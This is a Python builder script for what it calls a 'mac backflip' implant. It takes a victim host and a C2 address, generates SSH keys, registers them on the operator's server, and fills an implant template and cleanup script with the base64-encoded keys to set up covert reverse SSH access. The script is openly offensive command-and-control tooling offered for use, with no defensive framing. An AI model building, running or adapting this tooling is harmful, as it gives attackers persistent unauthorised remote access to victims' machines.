#!/usr/bin/env python3

import os
import sys
import base64
from io import StringIO
import gzip
import re
import tempfile
import uuid

logging = True

def usage():
    print ("usage: %s <username> <victim_host> <c2_fqdn/ip> <port> <remoteport>" % sys.argv[0])
    sys.exit(1)

def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if not logging and "log" in l:
                continue
            o += l
    return o



def main():
    if len(sys.argv) < 5:
        usage()
    if os.getuid() != 0:
        sys.stderr.write("you must use sudo\n")
        sys.exit(1)

    username = sys.argv[1]
    victim_hostname = sys.argv[2]
    fqdn = sys.argv[3]
    port = sys.argv[4]
    remoteport = sys.argv[5]

    
    print ("[*] victim host: %s" % victim_hostname)
    print ("[*] fqdn: %s" % fqdn)
    print ("[*] port: %s" % port)

    KEYPATH = f"/opt/backflips/keys/{username}-{victim_hostname}-{fqdn}"
    print (f"[*] keypath: {KEYPATH}")
    print ("[*] generating keypair")
    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{KEYPATH}' -N ''")
    print ("[*] adding to flip's authorized keys")
    os.system("echo '' >> /opt/backflips/authorized_keys")
    os.system(f"cat '{KEYPATH}.pub' >> /opt/backflips/authorized_keys")
    os.system(f"echo \"{fqdn} $(ssh-keyscan -p {remoteport} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">/opt/backflips/keys/serverpub.pub")
    backstring= getfile("/opt/backflips/keys/serverpub.pub")
    backencode = backstring.encode("utf-8")
    backkey = base64.b64encode(backencode)
    pubstring = getfile(KEYPATH+ ".pub")
    pubencoded = pubstring.encode("utf-8")
    pubkey = base64.b64encode(pubencoded)
    privstring = getfile(KEYPATH)
    privencoded = privstring.encode("utf-8")
    privkey = base64.b64encode(privencoded)
    implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
    cleanup_py = getfile(os.path.join(sys.path[0],"cleanup.sh"))
    implant = templify(implant_py, {
        "PORT_PLACEHOLDER" : port,
        "REMOTE_PLACEHOLDER": remoteport,
        "FQDN_PLACEHOLDER" : fqdn,
        "PRIVATE_KEY_PLACEHOLDER" : privkey.decode("utf-8"),
        "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
        "BACKFLIP_PUB_PLACEHOLDER":backkey.decode("utf-8"),
        })
    implant_clean = templify(cleanup_py,{
        "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
        "BACKFLIP_PUB_PLACEHOLDER":backkey.decode("utf-8"),
    })
    filename = str(uuid.uuid4())

    with open(KEYPATH+filename+'_cleanup.sh','w') as file2:
        file2.write(implant_clean)
    with open(KEYPATH+filename,'w') as file:
        file.write(implant)
    print (f"[+] The mac backflip is located @ {KEYPATH}{filename}")


if __name__ == "__main__":
    main()

#
# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
#
# Local variables:
# c-basic-offset: 4
# indent-tabs-mode: nil
# End:
#
# vi: set shiftwidth=4 expandtab:
# :indentSize=4:noTabs=true:
#